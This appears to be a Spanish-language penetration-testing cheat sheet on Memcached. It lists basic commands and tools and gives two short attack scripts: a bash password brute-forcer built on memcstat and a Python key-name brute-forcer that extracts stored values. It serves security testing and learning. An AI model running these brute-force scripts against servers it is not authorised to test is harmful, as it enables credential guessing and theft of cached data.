# MEMCACHED
Memcached es un almacén de key-values en memoria para pequeños trozos de datos arbitrarios (cadenas, objetos) de resultados de llamadas a bases de datos, llamadas a la API o representación de páginas web.

## **Basics**
* get       - Lee el valor de una key
* set       - Establece una key
* add       - Agrega una nueva key
* replace   - Reemplaza una key existente
* append    - Agrega datos a una key existente
* delete    - Elimina una key existente
* stats     - Imprime status
* version   - Muestra la version

## **Tools**
* nmap
* telnet
* netcat
* memcached-cli
* python-binary-memcached
* memcstat 
* memcdump
* memcached-tool


## **Enumeration**
...

## **Attacks**

Brute Force     
`Usage: ./script.sh <IP> <USER> <WORDLIST>`
```bash
#!/bin/bash

while read F ; do
echo "Trying $F" > /dev/null
    if memcstat --servers=$1 --username=$2 --password=$F | grep -q Server ; then
    echo "[+] Password Found: "$F
    break
fi
done < $3
```

Key value brute force       
`Usage: python3 script.py <WORDLIST>`
```python
#!/usr/bin/python3

import bmemcached
import sys
from pwn import *

brutefile = sys.argv[1]
connect = bmemcached.Client('IP:PORT', 'USER', 'PASS')
brutefile = open(brutefile).readlines()
for param in brutefile:
    param = param.strip()
    result = str(connect.get(param))
    if 'None' not in result:
        print()
        log.info(f"Key -> {param}")
        log.success(result)
```

## **References**
* https://itecsoftware.com/testing-memcached-using-telnet-commands
* https://www.npmjs.com/package/memcached-cli
* https://pypi.org/project/python-binary-memcached/
* https://github.com/danielmiessler/SecLists/tree/master/Discovery/Variables 
* https://www.rapid7.com/db/modules/auxiliary/gather/memcached_extractor/ 
* https://nmap.org/nsedoc/scripts/memcached-info.html
* https://github.com/memcached/memcached/blob/master/scripts/memcached-tool
* https://www.hackingarticles.in/penetration-testing-on-memcached-server/
